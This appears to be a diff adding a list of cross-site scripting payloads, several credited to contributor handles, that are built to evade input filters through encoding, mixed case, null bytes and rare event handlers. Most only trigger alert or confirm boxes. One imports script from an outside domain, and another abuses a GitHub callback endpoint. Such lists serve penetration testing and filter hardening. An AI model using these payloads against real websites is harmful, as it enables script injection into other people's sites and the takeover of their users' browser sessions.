@@ -1,0 +1,21 @@
+"/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+%20%27%3C00%20foo%3D%22%3Ca%2520href%3D%22javascript%3Aalert%28%27XSS-Bypass%27%29%22%3EXSS-CLick%3C%2F00%3E--%2520%2F
+ '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+ onfocus=alert&#x00000000028;1&#x00000000029; autofocus>
+"--!><Svg/Onload=confirm`cookie`>"
+<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(`VulneravelXSS`%26%2300000000000000000041//
+"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
+"*prompt(document.domain)*"
+xss">x%253Csvg%2520onload=alert%26%230000000040"1")%253E
+>><marquee loop=1 width=0 onfinish=alert(1)> -@manjith27945363
+ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -@naglinagli
+x"><svg%250donload%3D"window%5B%27alert%27%5D(location[%27hostname%27])"
+OnXSS=<Img/Src/OnError=alert(1)>
+<</div>script</div>>alert()<</div>/script</div>>
+<Img Src=OnXSS OnError​=confirm(1)>
+‘>alert(154)</script><script/154=’;;;;;;
+{alert`1`} 
+#"></div><a href= javascript&colon;alert&lpar;document&period;domain)
+<script src=https://api.github.com/gist/anything?callback=alert></script>
